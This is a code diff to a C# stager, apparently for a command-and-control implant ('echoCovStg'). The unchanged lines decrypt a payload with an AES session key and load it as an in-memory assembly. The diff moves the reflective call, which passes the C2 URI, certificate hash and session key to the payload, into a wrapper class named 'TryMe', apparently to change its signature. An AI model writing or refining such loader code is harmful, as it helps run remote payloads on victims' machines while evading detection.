@@ -238,9 +238,33 @@ namespace echoCovStg
                 MySesK.IV = Convert.FromBase64String(My64IV);
                 byte[] DCA = MySesK.CreateDecryptor().TransformFinalBlock(messBy, 0, messBy.Length);
                 Assembly EchoAss = Assembly.Load(DCA);
-                EchoAss.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { EchoURI, EchoCertHash, GUID, MySesK });
+                object[] parameters = new object[] {EchoURI, EchoCertHash, GUID, MySesK };
+                TryMe tryMeInstance = new TryMe();
+                tryMeInstance.TheRuns(EchoAss, parameters);
             }
             catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
+        }
+
+        public class TryMe
+        {
+            public object TheRuns(Assembly EchoAss, object[] parameters)
+            {
+                Type[] types = EchoAss.GetTypes();
+                if (types.Length == 0)
+                {
+                    return null;
+                }
+
+                Type targetType = types[0];
+                MethodInfo[] methods = targetType.GetMethods();
+                if (methods.Length == 0)
+                {
+                    return null;
+                }
+                MethodInfo targetMethod = methods[0];
+
+                return targetMethod.Invoke(null, parameters);
+            }
         }
 
         public class EchoWeCli : WebClient
